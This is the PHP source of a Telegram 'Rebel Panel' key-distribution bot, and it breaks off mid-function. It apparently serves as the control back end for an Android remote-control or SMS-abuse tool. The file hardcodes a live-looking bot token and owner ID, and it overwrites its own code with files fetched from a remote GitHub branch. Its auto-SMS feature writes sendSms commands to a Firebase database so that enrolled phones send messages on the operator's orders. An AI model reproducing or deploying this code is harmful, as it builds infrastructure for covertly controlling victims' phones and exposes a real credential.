<?php
define('REBEL_BOT_TOKEN', '8952674967:AAGivOmzdznNBdRK2j_trdnnwv5lCDX8caA');
define('REBEL_OWNER_ID', '8432393497');
define('REBEL_BOT_USERNAME', 'Rebelpanelbot');
define('REBEL_BOT_VERSION', '2.4-parentapk');
define('REBEL_KEYS_FILE', __DIR__ . '/data/rebel_keys.json');
define('REBEL_POLL_OFFSET_FILE', __DIR__ . '/data/rebel_bot_offset.txt');
define('REBEL_SMS_TOKEN_CONFIG_FILE', __DIR__ . '/data/sms_token_config.json');
define('REBEL_BOT_DEVICE_LOCKS_FILE', __DIR__ . '/data/rebel_device_locks.json');
define('REBEL_BOT_KILL_SWITCH_FILE', __DIR__ . '/data/rebel_kill_switch.json');
define('REBEL_BOT_UPDATE_BRANCH', 'cursor/apk-crack-ban-1641');

function rebel_bot_json_load($file) {
  if (!is_file($file)) return [];
  $j = json_decode(@file_get_contents($file) ?: '{}', true);
  return is_array($j) ? $j : [];
}

function rebel_bot_json_save($file, $data) {
  $dir = dirname($file);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

function rebel_bot_list_banned_devices() {
  if (function_exists('rebel_list_banned_devices')) return rebel_list_banned_devices();
  $out = [];
  $locks = rebel_bot_json_load(REBEL_BOT_DEVICE_LOCKS_FILE);
  foreach ($locks as $fp => $row) {
    if (!is_array($row)) continue;
    $out[] = [
      'device_fp' => (string)$fp,
      'reason' => (string)($row['reason'] ?? ''),
      'at' => (int)($row['at'] ?? 0),
      'source' => 'locks'
    ];
  }
  $kill = rebel_bot_json_load(REBEL_BOT_KILL_SWITCH_FILE);
  if (!empty($kill['devices']) && is_array($kill['devices'])) {
    foreach ($kill['devices'] as $fp => $row) {
      if (!is_array($row)) continue;
      $found = false;
      foreach ($out as $o) {
        if ($o['device_fp'] === (string)$fp) { $found = true; break; }
      }
      if (!$found) {
        $out[] = [
          'device_fp' => (string)$fp,
          'reason' => (string)($row['reason'] ?? ''),
          'at' => (int)($row['at'] ?? 0),
          'source' => 'kill_switch'
        ];
      }
    }
  }
  return $out;
}

function rebel_bot_unban_device($deviceFp) {
  if (function_exists('rebel_unban_device')) return rebel_unban_device($deviceFp);
  $deviceFp = trim((string)$deviceFp);
  if ($deviceFp === '') return false;
  $cleared = false;
  $locks = rebel_bot_json_load(REBEL_BOT_DEVICE_LOCKS_FILE);
  if (isset($locks[$deviceFp])) {
    unset($locks[$deviceFp]);
    rebel_bot_json_save(REBEL_BOT_DEVICE_LOCKS_FILE, $locks);
    $cleared = true;
  }
  $kill = rebel_bot_json_load(REBEL_BOT_KILL_SWITCH_FILE);
  if (!empty($kill['devices'][$deviceFp])) {
    unset($kill['devices'][$deviceFp]);
    rebel_bot_json_save(REBEL_BOT_KILL_SWITCH_FILE, $kill);
    $cleared = true;
  }
  return $cleared;
}

function rebel_bot_unban_all_devices() {
  if (function_exists('rebel_unban_all_devices')) return rebel_unban_all_devices();
  $count = 0;
  $locks = rebel_bot_json_load(REBEL_BOT_DEVICE_LOCKS_FILE);
  if (is_array($locks)) $count += count($locks);
  rebel_bot_json_save(REBEL_BOT_DEVICE_LOCKS_FILE, []);
  $kill = rebel_bot_json_load(REBEL_BOT_KILL_SWITCH_FILE);
  if (!empty($kill['devices']) && is_array($kill['devices'])) {
    $count += count($kill['devices']);
    $kill['devices'] = [];
    rebel_bot_json_save(REBEL_BOT_KILL_SWITCH_FILE, $kill);
  }
  return $count;
}

function rebel_ota_deploy_panel() {
  $base = 'https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/' . REBEL_BOT_UPDATE_BRANCH . '/panel/';
  $otaDir = __DIR__ . '/ota';
  if (!is_dir($otaDir)) @mkdir($otaDir, 0755, true);
  $files = ['index.html', 'style.css', 'app.js', 'avatar.jpg', 'deploy_bot.php', 'firebase_defaults.js'];
  $updated = [];
  $errors = [];
  $ctx = stream_context_create(['http' => ['timeout' => 30, 'user_agent' => 'RebelPanel-OTA/1.0']]);
  foreach ($files as $name) {
    $data = @file_get_contents($base . 'ota/' . rawurlencode($name), false, $ctx);
    if ($data === false || strlen($data) < 20) {
      $errors[] = $name;
      continue;
    }
    if (@file_put_contents($otaDir . '/' . $name, $data) === false) {
      $errors[] = $name . ':write';
      continue;
    }
    $updated[] = 'ota/' . $name;
  }
  $manifest = @file_get_contents($base . 'panel_ota.json', false, $ctx);
  $ver = 0;
  if ($manifest && @file_put_contents(__DIR__ . '/panel_ota.json', $manifest) !== false) {
    $updated[] = 'panel_ota.json';
    $j = json_decode($manifest, true);
    if (is_array($j)) $ver = (int)($j['panel_version'] ?? 0);
  } else {
    $errors[] = 'panel_ota.json';
  }
  return ['updated' => $updated, 'errors' => $errors, 'panel_version' => $ver];
}

function rebel_bot_pull_update_files() {
  $base = 'https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/' . REBEL_BOT_UPDATE_BRANCH . '/panel/';
  $files = ['rebel_bot_lib.php', 'rebel_secure_lib.php', 'rebel_secure_api.php', 'phone.php', 'sex.php', 'laptop.php', 'firebase_defaults.js', 'rebel_bot.php', 'owner_unban.php', 'owner_parent_apk.php', 'bot_pull_update.php', 'ota_pull_update.php'];
  $updated = [];
  $errors = [];
  $ctx = stream_context_create(['http' => ['timeout' => 30, 'user_agent' => 'RebelPanel-BotUpdater/1.0']]);
  foreach ($files as $name) {
    $data = @file_get_contents($base . rawurlencode($name), false, $ctx);
    if ($data === false || strlen($data) < 50) {
      $errors[] = $name;
      continue;
    }
    if (@file_put_contents(__DIR__ . '/' . $name, $data) === false) {
      $errors[] = $name . ':write';
      continue;
    }
    $updated[] = $name;
  }
  $ota = rebel_ota_deploy_panel();
  return ['updated' => $updated, 'errors' => $errors, 'ota' => $ota];
}

function rebel_json_out($data, $code = 200) {
  http_response_code($code);
  header('Content-Type: application/json; charset=UTF-8');
  header('Cache-Control: no-store');
  echo json_encode($data);
  exit;
}

function rebel_keys_load() {
  if (!is_file(REBEL_KEYS_FILE)) {
    $dir = dirname(REBEL_KEYS_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    file_put_contents(REBEL_KEYS_FILE, json_encode(['keys' => [], 'sessions' => []], JSON_PRETTY_PRINT));
  }
  $raw = @file_get_contents(REBEL_KEYS_FILE);
  $data = json_decode($raw ?: '{}', true);
  if (!is_array($data)) $data = [];
  if (!isset($data['keys']) || !is_array($data['keys'])) $data['keys'] = [];
  if (!isset($data['sessions']) || !is_array($data['sessions'])) $data['sessions'] = [];
  return $data;
}

function rebel_keys_merge($disk, $incoming) {
  if (!is_array($disk)) $disk = ['keys' => [], 'sessions' => []];
  if (!is_array($incoming)) $incoming = ['keys' => [], 'sessions' => []];
  $merged = [
    'keys' => is_array($disk['keys'] ?? null) ? $disk['keys'] : [],
    'sessions' => is_array($disk['sessions'] ?? null) ? $disk['sessions'] : []
  ];
  foreach ($incoming['keys'] ?? [] as $k => $row) {
    $merged['keys'][$k] = $row;
  }
  foreach ($incoming['sessions'] ?? [] as $hash => $sess) {
    $cur = $merged['sessions'][$hash] ?? null;
    if (!$cur || (int)($sess['expires'] ?? 0) >= (int)($cur['expires'] ?? 0)) {
      $merged['sessions'][$hash] = $sess;
    }
  }
  foreach ($incoming['_prune_sessions'] ?? [] as $hash) {
    unset($merged['sessions'][$hash]);
  }
  return $merged;
}

/** Atomic read-modify-write for rebel_keys.json (avoids stale session loss). */
function rebel_keys_mutate(callable $fn) {
  $dir = dirname(REBEL_KEYS_FILE);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  $fp = fopen(REBEL_KEYS_FILE, 'c+');
  if (!$fp) return null;
  flock($fp, LOCK_EX);
  $raw = stream_get_contents($fp);
  $data = json_decode($raw ?: '{}', true);
  if (!is_array($data)) $data = ['keys' => [], 'sessions' => []];
  if (!isset($data['keys']) || !is_array($data['keys'])) $data['keys'] = [];
  if (!isset($data['sessions']) || !is_array($data['sessions'])) $data['sessions'] = [];
  $result = $fn($data);
  ftruncate($fp, 0);
  rewind($fp);
  fwrite($fp, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
  fflush($fp);
  flock($fp, LOCK_UN);
  fclose($fp);
  return $result;
}

function rebel_keys_save($data) {
  $dir = dirname(REBEL_KEYS_FILE);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  $fp = fopen(REBEL_KEYS_FILE, 'c+');
  if (!$fp) return false;
  flock($fp, LOCK_EX);
  $raw = stream_get_contents($fp);
  $disk = json_decode($raw ?: '{}', true);
  $merged = rebel_keys_merge($disk, $data);
  ftruncate($fp, 0);
  rewind($fp);
  fwrite($fp, json_encode($merged, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
  fflush($fp);
  flock($fp, LOCK_UN);
  fclose($fp);
  return true;
}

function rebel_make_key($type = 'web') {
  return rebel_make_key_for_type($type);
}

/** @param string $type apk|web */
function rebel_make_key_for_type($type = 'web') {
  $a = strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
  $b = strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
  $type = strtolower(trim((string)$type));
  if ($type === 'apk') return 'RBA-' . $a . '-' . $b;
  if ($type === 'parent') return 'RBP-' . $a . '-' . $b;
  return 'RBW-' . $a . '-' . $b;
}

/** apk | parent | web | '' */
function rebel_key_infer_type($key) {
  $key = rebel_norm_key($key);
  if (strpos($key, 'RBP-') === 0) return 'parent';
  if (strpos($key, 'RBA-') === 0) return 'apk';
  if (strpos($key, 'RBW-') === 0) return 'web';
  if (strpos($key, 'RBL-') === 0) return 'web';
  return '';
}

/** @param string $client apk|parent|web */
function rebel_key_allowed_for_client($row, $client) {
  if (!is_array($row)) return false;
  $client = strtolower(trim((string)$client));
  $rowType = strtolower(trim((string)($row['type'] ?? '')));
  if ($rowType === '') return $client === 'web';
  return $rowType === $client;
}

function rebel_bot_create_key($chatId, $type, $days = 30) {
  $type = strtolower(trim((string)$type));
  if (!in_array($type, ['apk', 'parent', 'web'], true)) $type = 'web';
  $days = max(0, (int)$days);
  $data = rebel_keys_load();
  $key = rebel_make_key_for_type($type);
  while (isset($data['keys'][$key])) $key = rebel_make_key_for_type($type);
  $data['keys'][$key] = [
    'created' => time(),
    'expires' => $days > 0 ? time() + ($days * 86400) : 0,
    'active' => true,
    'used' => false,
    'revoked' => false,
    'uses' => 0,
    'type' => $type,
    'label' => $type . '-tg-' . date('dM-Hi')
  ];
  rebel_keys_save($data);
  $exp = $days > 0 ? ("\n⏳ Expires: " . date('d M Y, h:i A', $data['keys'][$key]['expires'])) : "\n♾️ No expiry";
  if ($type === 'parent') {
    $where = "👑 <b>Parent APK only</b> — Rebel Panel Pro (sirf tumhare phone par)";
  } elseif ($type === 'apk') {
    $where = "📱 <b>User APK only</b> — paste in Rebel Panel app login";
  } else {
    $where = "🌐 <b>Website only</b> — paste on rebelbhaiya.alwaysdata.net panel";
  }
  $icon = $type === 'parent' ? '👑' : ($type === 'apk' ? '📱' : '🌐');
  rebel_tg_send($chatId, $icon . " <b>New " . strtoupper($type) . " Key</b> (one-time)\n\n<code>" . $key . "</code>" . $exp . "\n\n" . $where . "\n\n⚠️ One device · one use only");
  return $key;
}

function rebel_norm_key($key) {
  $key = strtoupper(trim((string)$key));
  return preg_replace('/\s+/', '', $key);
}

function rebel_key_login_allowed(&$data, $key) {
  $key = rebel_norm_key($key);
  if ($key === '' || !isset($data['keys'][$key])) return false;
  $row = $data['keys'][$key];
  if (!empty($row['revoked'])) return false;
  if (!empty($row['used']) || (int)($row['uses'] ?? 0) >= 1) return false;
  if (empty($row['active'])) return false;
  if (!empty($row['expires']) && time() > (int)$row['expires']) {
    $data['keys'][$key]['active'] = false;
    return false;
  }
  return $key;
}

function rebel_consume_key(&$data, $key) {
  if (!isset($data['keys'][$key])) return;
  $data['keys'][$key]['used'] = true;
  $data['keys'][$key]['uses'] = 1;
  $data['keys'][$key]['active'] = false;
  $data['keys'][$key]['used_at'] = time();
}

function rebel_purge_sessions_for_key(&$data, $key) {
  $prune = [];
  foreach ($data['sessions'] as $hash => $sess) {
    if (($sess['key_ref'] ?? '') === $key) {
      $prune[] = $hash;
      unset($data['sessions'][$hash]);
    }
  }
  if ($prune) {
    $data['_prune_sessions'] = array_values(array_unique(array_merge($data['_prune_sessions'] ?? [], $prune)));
  }
}

function rebel_revoke_key(&$data, $key) {
  $key = rebel_norm_key($key);
  if (!isset($data['keys'][$key])) return false;
  $data['keys'][$key]['active'] = false;
  $data['keys'][$key]['revoked'] = true;
  $data['keys'][$key]['revoked_at'] = time();
  rebel_purge_sessions_for_key($data, $key);
  return true;
}

function rebel_revoke_all_keys(&$data) {
  $revoked = 0;
  $now = time();
  foreach (array_keys($data['keys'] ?? []) as $k) {
    $data['keys'][$k]['active'] = false;
    $data['keys'][$k]['revoked'] = true;
    $data['keys'][$k]['revoked_at'] = $now;
    $revoked++;
  }
  $sessions = count($data['sessions'] ?? []);
  if ($sessions) {
    $data['_prune_sessions'] = array_keys($data['sessions']);
  }
  $data['sessions'] = [];
  return ['keys_revoked' => $revoked, 'sessions_cleared' => $sessions];
}

function rebel_session_valid(&$data, $token, $renew = false) {
  $token = trim((string)$token);
  if ($token === '') return false;
  $hash = hash('sha256', $token);
  $sess = $data['sessions'][$hash] ?? null;
  if (!$sess || time() > (int)($sess['expires'] ?? 0)) {
    if (isset($data['sessions'][$hash])) unset($data['sessions'][$hash]);
    return false;
  }
  $keyRef = (string)($sess['key_ref'] ?? '');
  if ($keyRef !== '' && isset($data['keys'][$keyRef])) {
    if (!empty($data['keys'][$keyRef]['revoked'])) {
      unset($data['sessions'][$hash]);
      return false;
    }
  }
  $ttl = (int)($sess['ttl'] ?? (30 * 86400));
  if ($ttl < 3600) $ttl = 30 * 86400;
  if ($renew) {
    $data['sessions'][$hash]['expires'] = time() + $ttl;
    $data['sessions'][$hash]['last_seen'] = time();
  }
  return [
    'expires' => (int)$data['sessions'][$hash]['expires'],
    'created' => (int)($sess['created'] ?? 0),
    'key_ref' => $keyRef
  ];
}

function rebel_create_session(&$data, $key, $remember) {
  $token = bin2hex(random_bytes(24));
  $hash = hash('sha256', $token);
  $ttl = 30 * 86400;
  $data['sessions'][$hash] = [
    'created' => time(),
    'expires' => time() + $ttl,
    'ttl' => $ttl,
    'key_ref' => $key,
    'remember' => !empty($remember)
  ];
  return ['token' => $token, 'expires' => time() + $ttl];
}

function rebel_tg_api($method, $params = []) {
  $url = 'https://api.telegram.org/bot' . REBEL_BOT_TOKEN . '/' . $method;
  $payload = json_encode($params ?: new stdClass());
  if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_POST => true,
      CURLOPT_POSTFIELDS => $payload,
      CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
      CURLOPT_TIMEOUT => 35,
      CURLOPT_CONNECTTIMEOUT => 15
    ]);
    $raw = curl_exec($ch);
    curl_close($ch);
    return json_decode($raw ?: '{}', true);
  }
  $ctx = stream_context_create([
    'http' => [
      'method' => 'POST',
      'header' => "Content-Type: application/json\r\n",
      'content' => $payload,
      'timeout' => 35
    ]
  ]);
  $raw = @file_get_contents($url, false, $ctx);
  return json_decode($raw ?: '{}', true);
}

function rebel_tg_send($chatId, $text) {
  return rebel_tg_api('sendMessage', [
    'chat_id' => $chatId,
    'text' => $text,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
  ]);
}

function rebel_tg_send_document($chatId, $filePath, $caption = '') {
  if (!is_file($filePath)) return ['ok' => false, 'description' => 'file_missing'];
  $url = 'https://api.telegram.org/bot' . REBEL_BOT_TOKEN . '/sendDocument';
  $post = [
    'chat_id' => $chatId,
    'document' => new CURLFile($filePath, 'application/vnd.android.package-archive', basename($filePath)),
  ];
  if ($caption !== '') $post['caption'] = $caption;
  $ch = curl_init($url);
  curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 120,
  ]);
  $raw = curl_exec($ch);
  curl_close($ch);
  return json_decode($raw ?: '{}', true);
}

function rebel_parent_apk_path() {
  $paths = [
    __DIR__ . '/private/RebelPanel-Parent.apk',
    __DIR__ . '/data/RebelPanel-Parent.apk',
  ];
  foreach ($paths as $p) {
    if (is_file($p) && filesize($p) > 100000) return $p;
  }
  return '';
}

function rebel_tg_set_webhook($hookUrl) {
  return rebel_tg_api('setWebhook', ['url' => $hookUrl, 'drop_pending_updates' => true]);
}

function rebel_bot_norm_cmd($text) {
  $text = trim((string)$text);
  $text = preg_replace('/@\w+/i', '', $text);
  return trim($text);
}

function rebel_bot_webhook_url() {
  $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
  $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
  $script = $_SERVER['SCRIPT_NAME'] ?? '/panel/sex.php';
  if (basename($script) === 'rebel_bot.php') $script = dirname($script) . '/sex.php';
  return $scheme . '://' . $host . $script . '?rebel_bot_webhook=1';
}

function rebel_sms_token_config_load() {
  if (!is_file(REBEL_SMS_TOKEN_CONFIG_FILE)) {
    $dir = dirname(REBEL_SMS_TOKEN_CONFIG_FILE);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    $def = ['enabled' => false, 'device_id' => '', 'database_url' => 'https://rabel-raand-default-rtdb.firebaseio.com', 'fb_name' => 'Rebel', 'log' => []];
    file_put_contents(REBEL_SMS_TOKEN_CONFIG_FILE, json_encode($def, JSON_PRETTY_PRINT));
  }
  $raw = @file_get_contents(REBEL_SMS_TOKEN_CONFIG_FILE);
  $data = json_decode($raw ?: '{}', true);
  if (!is_array($data)) $data = [];
  if (!isset($data['log']) || !is_array($data['log'])) $data['log'] = [];
  return $data;
}

function rebel_sms_token_config_save($data) {
  $dir = dirname(REBEL_SMS_TOKEN_CONFIG_FILE);
  if (!is_dir($dir)) @mkdir($dir, 0755, true);
  file_put_contents(REBEL_SMS_TOKEN_CONFIG_FILE, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
}

function rebel_parse_sms_token($text) {
  $text = trim((string)$text);
  if ($text === '' || !preg_match('/SMS\s*TOKEN/i', $text)) return null;
  $to = '';
  if (preg_match('/(?:📞\s*)?To:\s*([+\d\s\-()]+)/iu', $text, $m)) {
    $to = preg_replace('/\D/', '', $m[1]);
  }
  $msg = '';
  if (preg_match('/(?:💬\s*)?Message:\s*(.+)/isu', $text, $m)) {
    $msg = trim($m[1]);
    $msg = preg_replace('/[━─_]{3,}.*$/su', '', $msg);
    $msg = trim($msg);
  }
  if (strlen($to) < 10 || $msg === '') return null;
  if (strlen($to) > 10) $to = substr($to, -10);
  return ['to' => $to, 'message' => $msg];
}

function rebel_firebase_send_sms($dbUrl, $deviceId, $to, $message) {
  $dbUrl = rtrim((string)$dbUrl, '/');
  $deviceId = trim((string)$deviceId);
  if ($dbUrl === '' || $deviceId === '') return ['ok' => false, 'error' => 'Firebase URL or device not set'];
  $path = $dbUrl . '/clients/' . rawurlencode($deviceId) . '/webhookEvent/sendSms.json';
  $payload = json_encode(['to' => $to, 'message' => $message, 'from' => 1, 'isSended' => false]);
  if (function_exists('curl_init')) {
    $ch = curl_init($path);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_CUSTOMREQUEST => 'PUT',
      CURLOPT_POSTFIELDS => $payload,
      CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
      CURLOPT_TIMEOUT => 20
    ]);
    $raw = curl_exec($ch);
    $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code >= 200 && $code < 300) return ['ok' => true];
    return ['ok' => false, 'error' => 'Firebase HTTP ' . $code, 'detail' => $raw];
  }
  $ctx = stream_context_create([
    'http' => ['method' => 'PUT', 'header' => "Content-Type: application/json\r\n", 'content' => $payload, 'timeout' => 20, 'ignore_errors' => true]
  ]);
  $raw = @file_get_contents($path, false, $ctx);
  return ['ok' => $raw !== false, 'detail' => $raw];
}

function rebel_sms_token_log($entry) {
  $cfg = rebel_sms_token_config_load();
  array_unshift($cfg['log'], $entry);
  $cfg['log'] = array_slice($cfg['log'], 0, 40);
  rebel_sms_token_config_save($cfg);
}

function rebel_sms_token_try_send($text, $meta) {
  $parsed = rebel_parse_sms_token($text);
  if (!$parsed) return false;
  $cfg = rebel_sms_token_config_load();
  if (empty($cfg['enabled'])) {
    rebel_sms_token_log(['ts' => time(), 'ok' => false, 'to' => $parsed['to'], 'message' => $parsed['message'], 'error' => 'Auto token SMS disabled', 'source' => $meta['source'] ?? '']);
    return true;
  }
  $dedup = md5($parsed['to'] . '|' . $parsed['message']);
  foreach ($cfg['log'] as $row) {
    if (!empty($row['dedup']) && $row['dedup'] === $dedup && (time() - (int)($row['ts'] ?? 0)) < 120) return true;
  }
  if (empty($cfg['device_id']) || empty($cfg['database_url'])) {
    rebel_sms_token_log(['ts' => time(), 'ok' => false, 'to' => $parsed['to'], 'message' => $parsed['message'], 'error' => 'Device or Firebase not configured', 'source' => $meta['source'] ?? '']);
    rebel_tg_send(REBEL_OWNER_ID, "❌ SMS TOKEN parsed but device not set.\nTo: <code>" . $parsed['to'] . "</code>\nPanel → Auto Token → Enable + select device");
    return true;
  }
  $res = rebel_firebase_send_sms($cfg['database_url'], $cfg['device_id'], $parsed['to'], $parsed['message']);
  rebel_sms_token_log([
    'ts' => time(), 'ok' => !empty($res['ok']), 'to' => $parsed['to'], 'message' => $parsed['message'],
    'device' => $cfg['device_id'], 'source' => $meta['source'] ?? '', 'dedup' => $dedup,
    'error' => $res['error'] ?? ''
  ]);
  if (!empty($res['ok'])) {
    rebel_tg_send(REBEL_OWNER_ID, "✅ <b>Auto SMS Sent</b>\n\n📞 To: <code>" . $parsed['to'] . "</code>\n💬 " . htmlspecialchars(mb_substr($parsed['message'], 0, 200), ENT_QUOTES, 'UTF-8'));
  } else {
    rebel_tg_send(REBEL_OWNER_ID, "❌ Auto SMS failed\nTo: <code>" . $parsed['to'] . "</code>\n" . htmlspecialchars($res['error'] ?? 'Unknown', ENT_QUOTES, 'UTF-8'));
  }
  return true;
}

function rebel_bot_handle_update($update) {
  if (!empty($update['channel_post']) || !empty($update['edited_channel_post'])) {
    $post = $update['channel_post'] ?? $update['edited_channel_post'];
    $text = trim((string)($post['text'] ?? $post['caption'] ?? ''));
    if ($text !== '') rebel_sms_token_try_send($text, ['source' => 'channel', 'chat_id' => $post['chat']['id'] ?? '']);
    return true;
  }
  $msg = $update['message'] ?? null;
  if (!$msg) return false;
  $text = trim((string)($msg['text'] ?? $msg['caption'] ?? ''));
  if ($text !== '' && rebel_parse_sms_token($text)) {
    rebel_sms_token_try_send($text, ['source' => 'message', 'chat_id' => $msg['chat']['id'] ?? '']);
  }
  if (preg_match('/^\//', $text)) return rebel_bot_handle($update);
  return $text !== '';
}

function rebel_bot_handle($update) {
  $msg = $update['message'] ?? null;
  if (!$msg) return false;
  $chatId = (string)($msg['chat']['id'] ?? '');
  $fromId = (string)($msg['from']['id'] ?? '');
  $text = rebel_bot_norm_cmd($msg['text'] ?? '');
  if ($text === '') return false;

  if ($fromId !== REBEL_OWNER_ID) {
    rebel_tg_send($chatId, "⛔ Unauthorized.\nOnly owner can use this bot.");
    return true;
  }

  if (preg_match('/^\/start\b/i', $text)) {
    rebel_tg_send($chatId, "🤖 <b>Rebel Panel Key Bot</b> (@Rebelpanelbot)\n\n👑 <b>Parent (owner only)</b>\n/parentapk — Parent APK download\n/genkeyparent [days] — Parent key (RBP-...)\n\n📱 <b>User (distribute)</b>\n/genkeyapk [days] — User APK key (RBA-...)\n\n🌐 /genkey [days] — Website (RBW-...)\n/keys · /revoke · /revokeall\n/bans · /unbanall · /unban FP\n/updatebot · /otaupdate\n/smstoken · /setdevice\n/status · /poll · /webhook");
    return true;
  }

  if (preg_match('/^\/status\b/i', $text) || preg_match('/^\/botversion\b/i', $text)) {
    $me = rebel_tg_api('getMe', []);
    $wh = rebel_tg_api('getWebhookInfo', []);
    $mode = !empty($wh['result']['url']) ? 'Webhook' : 'Polling (or offline)';
    $url = $wh['result']['url'] ?? '—';
    $apkCmd = function_exists('rebel_bot_create_key') ? 'yes' : 'NO — send /updatebot';
    rebel_tg_send($chatId, "📡 <b>Bot Status</b>\n\nVersion: <code>" . REBEL_BOT_VERSION . "</code>\n/genkeyapk: " . $apkCmd . "\nBot: @" . ($me['result']['username'] ?? 'Rebelpanelbot') . "\nMode: " . $mode . "\nWebhook: <code>" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "</code>\nPending: " . (int)($wh['result']['pending_update_count'] ?? 0));
    return true;
  }

  if (preg_match('/^\/(updatebot|otaupdate)\b/i', $text)) {
    if (!function_exists('rebel_ota_deploy_panel')) {
      rebel_tg_send($chatId, "❌ Old bot lib.\n\nOpen in browser:\n<code>https://rebelbhaiya.alwaysdata.net/bot_pull_update.php?owner=" . REBEL_OWNER_ID . "</code>");
      return true;
    }
    $pull = preg_match('/^\/otaupdate\b/i', $text)
      ? ['updated' => [], 'errors' => [], 'ota' => rebel_ota_deploy_panel()]
      : rebel_bot_pull_update_files();
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'https';
    $host = $_SERVER['HTTP_HOST'] ?? 'rebelbhaiya.alwaysdata.net';
    $url = $scheme . '://' . $host . '/bot_pull_update.php?owner=' . REBEL_OWNER_ID . '&action=ota';
    $msg = "🔄 <b>" . (preg_match('/^\/otaupdate\b/i', $text) ? 'OTA Panel' : 'Server update') . "</b>\n\n";
    if (!empty($pull['updated'])) {
      $msg .= "✅ Files: " . implode(', ', $pull['updated']) . "\n";
    }
    if (!empty($pull['ota']['updated'])) {
      $msg .= "✅ OTA v" . (int)($pull['ota']['panel_version'] ?? 0) . ": " . implode(', ', $pull['ota']['updated']) . "\n";
    }
    $errs = array_merge($pull['errors'] ?? [], $pull['ota']['errors'] ?? []);
    if ($errs) {
      $msg .= "⚠️ " . implode(', ', $errs) . "\n";
    }
    if (empty($pull['updated']) && empty($pull['ota']['updated'])) {
      $msg .= "Browser:\n<code>" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "</code>\n";
    }
    $msg .= "\nRestart Rebel Panel app for new UI ☰";
    rebel_tg_send($chatId, $msg);
    return true;
  }

  if (preg_match('/^\/poll\b/i', $text)) {
    rebel_tg_api('deleteWebhook', ['drop_pending_updates' => false]);
    rebel_tg_send($chatId, "✅ Polling mode ON.\n\nRun on your server:\n<code>php rebel_bot.php</code>\n\nOr cron:\n<code>curl \"YOUR_DOMAIN/rebel_bot.php?poll=1&owner=8432393497\"</code>");
    return true;
  }

  if (preg_match('/^\/webhook\b/i', $text) || preg_match('/^\/setwebhook\b/i', $text)) {
    $hook = rebel_bot_webhook_url();
    if (strpos($hook, 'https://') !== 0) {
      rebel_tg_send($chatId, "❌ HTTPS domain required for webhook.\nCurrent: <code>" . htmlspecialchars($hook, ENT_QUOTES, 'UTF-8') . "</code>\n\nUse polling instead: /poll");
      return true;
    }
    $res = rebel_tg_set_webhook($hook);
    rebel_tg_send($chatId, !empty($res['ok']) ? "✅ Webhook set:\n<code>" . htmlspecialchars($hook, ENT_QUOTES, 'UTF-8') . "</code>" : ("❌ Webhook failed: " . htmlspecialchars($res['description'] ?? 'error', ENT_QUOTES, 'UTF-8')));
    return true;
  }

  if (!function_exists('rebel_bot_create_key') && preg_match('/^\/(genkeyapk|apk|keyapk)\b/i', $text)) {
    rebel_tg_send($chatId, "❌ Bot file outdated.\n\nSend /updatebot or open:\n<code>https://rebelbhaiya.alwaysdata.net/ota/deploy_bot.php?owner=" . REBEL_OWNER_ID . "</code>");
    return true;
  }

  if (preg_match('/^\/(parentapk|getparentapk)\b/i', $text)) {
    $apkPath = rebel_parent_apk_path();
    if ($apkPath !== '') {
      $r = rebel_tg_send_document($chatId, $apkPath, '👑 Rebel Panel Pro — Parent APK (private)');
      if (!empty($r['ok'])) {
        rebel_tg_send($chatId, "✅ <b>Parent APK sent</b>\n\nOwner only — do not share with users.\nLogin: /genkeyparent");
      } else {
        rebel_tg_send($chatId, "❌ Send failed. Upload file:\n<code>panel/private/RebelPanel-Parent.apk</code>");
      }
    } else {
      $cfgFile = __DIR__ . '/data/parent_apk.json';
      $cfg = is_file($cfgFile) ? json_decode(file_get_contents($cfgFile), true) : [];
      $url = trim((string)($cfg['url'] ?? ''));
      if ($url !== '') {
        rebel_tg_send($chatId, "👑 <b>Parent APK</b> (private)\n\n<code>" . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . "</code>\n\nLogin: /genkeyparent\n\n⚠️ Do not send to users — they need the User APK from promo bot.");
      } else {
        rebel_tg_send($chatId, "👑 <b>Parent APK</b>\n\n1) GitHub Actions → download RebelPanel-Parent artifact\n2) Upload to server:\n<code>panel/private/RebelPanel-Parent.apk</code>\n3) Send /parentapk again\n\nLogin key: /genkeyparent");
      }
    }
    return true;
  }

  if (preg_match('/^\/(genkeyparent|parentkey)(?:\s+(\d+))?\s*$/i', $text, $m)) {
    rebel_bot_create_key($chatId, 'parent', isset($m[2]) ? (int)$m[2] : 365);
    return true;
  }

  if (preg_match('/^\/(genkeyapk|apk|keyapk)(?:\s+(\d+))?\s*$/i', $text, $m)) {
    rebel_bot_create_key($chatId, 'apk', isset($m[2]) ? (int)$m[2] : 30);
    return true;
  }

  if (preg_match('/^\/genkey\s+apk(?:\s+(\d+))?\s*$/i', $text, $m)) {
